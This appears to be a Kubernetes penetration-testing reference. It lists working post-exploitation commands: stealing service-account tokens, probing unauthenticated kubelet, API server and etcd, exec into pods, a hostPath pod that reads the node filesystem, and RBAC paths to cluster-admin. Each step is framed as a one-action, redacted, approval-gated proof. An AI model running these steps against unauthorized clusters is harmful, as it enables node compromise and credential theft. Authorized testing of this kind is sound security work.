# Kubernetes attack reference
# Post-ex, approval-gated. Benign proof (can-i + one read/list). No workload disruption. Redact tokens. Cleanup.

## From inside a pod
```
# Service account token + CA:
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
APISERVER=https://kubernetes.default.svc
kubectl --token=$TOKEN auth can-i --list                 # THE key enum: what can this SA do?
# dangerous positives: create pods, pods/exec, get/list secrets, create clusterrolebindings, * on *
```

## RBAC privesc paths (benign proof = can-i + one action, then clean up)
```
# can-i create pods  -> create a pod that mounts the host fs / hostPID, read a node marker, DELETE the pod:
#   (pod spec: volumes hostPath / : /host ; command reads /host/etc/hostname)  -> then kubectl delete pod
# can-i get secrets  -> read ONE benign configmap/secret name (don't dump all)
# can-i create clusterrolebindings / escalate / bind  -> privesc to cluster-admin (demonstrate can-i, don't persist)
# can-i create pods/exec  -> exec into an existing pod
```

## Exposed components (unauth)
```
# Kubelet read/write API :10250 :
kubeletctl -i --server <node> pods ; kubeletctl -i --server <node> exec "id" -p <pod> -c <container>
# API server anonymous:  curl -k https://<api>:6443/api/v1/namespaces/default/pods   (anonymous-auth=true)
# etcd :2379 (no auth) -> read all secrets ; Dashboard with skip-login ; cAdvisor :4194
# kube-hunter --remote <ip>   (recon)
```

## Pod → node → cluster
A privileged / hostPID / hostPath pod = node root. From the node, read kubelet creds / other pod secrets
(demonstrate reach, don't harvest). Tools: `peirates`, `kube-hunter`, `kubeletctl`, `kdigger`.

## Safety
Benign: `can-i` + ONE read/list (or a single host marker for node reach). Delete any test pod. Never disrupt
workloads, never dump all secrets, never touch out-of-scope namespaces. Redact tokens to a fingerprint.

---

## Extended arsenal — can-i verb → benign-proof decision matrix

| `kubectl auth can-i <verb> <resource>` | What it grants | Benign proof (one action, then revert) |
|---|---|---|
| `create pods` | run arbitrary image, mount host | create a marker pod (hostPath ro), read a node file, `delete pod` |
| `create pods/exec` | shell into existing pods | `exec` one benign `id` in a TEST pod (no state change) |
| `get/list secrets` | read all secret material | list secret NAMES only; read ONE test secret, redact |
| `create secrets` | plant credentials | create a TEST secret, read it back, delete it |
| `create clusterrolebindings` / `bind` | self-grant cluster-admin | demonstrate `can-i` = yes; do NOT create the binding |
| `escalate` (on roles) | widen own role | `can-i` proof only — escalation is approval-gated |
| `impersonate users/groups` | act as another principal | `kubectl auth can-i --list --as=<test-sa>` (dry identity check) |
| `create serviceaccounts/token` | mint SA tokens (TokenRequest) | mint a TEST SA token, redact, delete the SA |
| `patch/update deployments` | alter workloads | `can-i` only — NO patch (workload disruption) |
| `create pods/portforward` | tunnel to pod services | port-forward a TEST pod, curl its own endpoint, stop |
| `get nodes/proxy` | reach kubelet via the API | one benign `/healthz` via node proxy (read) |
| `delete <any>` | destroy resources | `can-i` only — CATALOGUED, never fired |

---

## Extended arsenal — SA token & projected-volume enumeration

```
ls -la /var/run/secrets/kubernetes.io/serviceaccount/          # token, ca.crt, namespace
# Projected (bound) token carries an audience + expiry — decode the NON-secret claims, REDACT the raw token:
cut -d. -f2 /var/run/secrets/kubernetes.io/serviceaccount/token | base64 -d 2>/dev/null   # aud / exp / sa (claims only)
# Over-mounted tokens/secrets elsewhere in this pod (common misconfig):
mount | grep -E 'secret|serviceaccount|projected' ; find / -maxdepth 6 -name token 2>/dev/null
# Token fingerprint for the report:  wc -c < <token>  -> REDACTED (len N, prefix 4). Never store the raw value.
```

---

## Extended arsenal — exposed component deep read-only checks

```
### Kubelet :10250 (read) / :10255 (read-only port)
curl -sk https://<node>:10250/pods         | jq '.items[].metadata.name'        # pod inventory (authz permitting)
curl -sk https://<node>:10250/runningpods/ | jq '.items[].metadata.name'
curl -sk https://<node>:10250/healthz ; curl -sk https://<node>:10250/metrics | head   # benign reach
curl -s  http://<node>:10255/pods          | jq '.items[].metadata.name'        # read-only port (if enabled)
#   kubelet exec/run EXECUTE code in a pod -> approval-gated; the reads above are benign reach proofs.
```
```
### API-server anonymous discovery (read-only)
curl -sk https://<api>:6443/version                                             # version (benign)
curl -sk https://<api>:6443/api ; curl -sk https://<api>:6443/apis              # discovery docs
curl -sk https://<api>:6443/.well-known/openid-configuration                    # OIDC issuer (recon)
#   if anonymous-auth=true, discovery (and sometimes list) answers WITHOUT a token -> note it; names only.
curl -sk https://<api>:6443/api/v1/namespaces -H "Authorization: Bearer $TOKEN" | jq '.items[].metadata.name'  # ns names
```
```
### etcd :2379 — KEY-NAME reach proof, NEVER dump values
ETCDCTL_API=3 etcdctl --endpoints=https://<node>:2379 --cacert ca --cert c --key k endpoint health   # benign health
ETCDCTL_API=3 etcdctl ... get /registry/namespaces --prefix --keys-only | head  # KEY NAMES only (no values)
#   reading /registry/secrets/* VALUES = mass secret disclosure -> CATALOGUED-NOT-FIRED; keys-only suffices as proof.
```
```
### Dashboard / cAdvisor / kube-proxy
curl -sk https://<node>/   # Dashboard: if "Skip" login works it runs as the dashboard SA (NOTE it, don't act)
curl -s http://<node>:4194/containers/ | head          # cAdvisor container stats (read-only recon)
curl -s http://<node>:10249/proxyMode                  # kube-proxy mode/health
curl -s http://<node>:10250/metrics/cadvisor | head    # cadvisor via kubelet
```

---

## Extended arsenal — read-only secret & configmap enumeration (names only)

```
kubectl --token=$TOKEN get secrets    -A -o custom-columns=NS:.metadata.namespace,NAME:.metadata.name,TYPE:.type
kubectl --token=$TOKEN get configmaps -A -o custom-columns=NS:.metadata.namespace,NAME:.metadata.name
# Benign impact proof = read ONE scoped TEST secret, redact to a fingerprint (length only):
kubectl --token=$TOKEN get secret <TEST-secret> -o jsonpath='{.data.*}' | wc -c      # -> REDACTED (len N, prefix 4)
#   high-value types to NOTE by name+type (never bulk-decode): kubernetes.io/service-account-token,
#   kubernetes.io/dockerconfigjson, kubernetes.io/tls.
```

---

## Extended arsenal — admission control awareness (PSA / PSP / webhooks)

```
# What will block a privileged / hostPath / hostPID pod BEFORE you try one:
kubectl --token=$TOKEN get ns <ns> -o jsonpath='{.metadata.labels}'             # PSA: pod-security.kubernetes.io/enforce=restricted|baseline|privileged
kubectl --token=$TOKEN get validatingwebhookconfigurations,mutatingwebhookconfigurations -o name   # OPA/Kyverno/etc
kubectl --token=$TOKEN get psp 2>/dev/null                                      # legacy PodSecurityPolicy (<=1.25)
#   enforce=restricted blocks hostPath/privileged/hostPID -> the node-reach pod below is REJECTED = a control that holds.
#   privileged or absent label -> admitted. Probe WITHOUT creating anything via server-side dry-run:
kubectl --token=$TOKEN create -f node-reach-pod.yaml --dry-run=server           # server-side admission check, creates nothing
```

---

## Extended arsenal — benign node-reach pod (marker read, then delete)

```
cat > /tmp/nr.yaml <<'YAML'
apiVersion: v1
kind: Pod
metadata: { name: redstrike-nr, namespace: <test-ns> }
spec:
  restartPolicy: Never
  containers:
  - name: c
    image: <allowed-image>
    command: ["sh","-c","cat /host/etc/hostname; sleep 5"]      # host-only read = node-reach proof
    volumeMounts: [{ name: h, mountPath: /host, readOnly: true }]
  volumes: [{ name: h, hostPath: { path: / } }]
YAML
kubectl --token=$TOKEN apply -f /tmp/nr.yaml
kubectl --token=$TOKEN logs redstrike-nr                        # shows the NODE hostname (host read)
kubectl --token=$TOKEN delete pod redstrike-nr --now ; rm /tmp/nr.yaml          # cleanup (cleanup.md)
#   hostPID variant (read host init env): set spec.hostPID:true + command 'cat /proc/1/root/etc/hostname'. Delete after.
```

---

## Extended arsenal — benign-proof & token-redaction contract (k8s)

- Proof ceiling = a `can-i` positive + ONE read/list (names only) OR ONE host-marker read via a single test pod
  that is deleted immediately. No workload patch/scale/delete, no secret bulk-dump, no out-of-scope namespace.
- Every test pod / test SA / test secret created is removed; record in cleanup.md. Use server-side `--dry-run` to
  probe admission without creating anything.
- Tokens (SA, projected, etcd client, kubelet) → REDACT to `REDACTED (len N, prefix 4)`; decode only the
  non-secret claim set for evidence.
- Cluster-admin self-grant (clusterrolebindings / bind / escalate), kubelet or etcd WRITE, workload mutation, and
  resource deletion = CATALOGUED / approval-gated — demonstrate reachability with `can-i`, never execute.
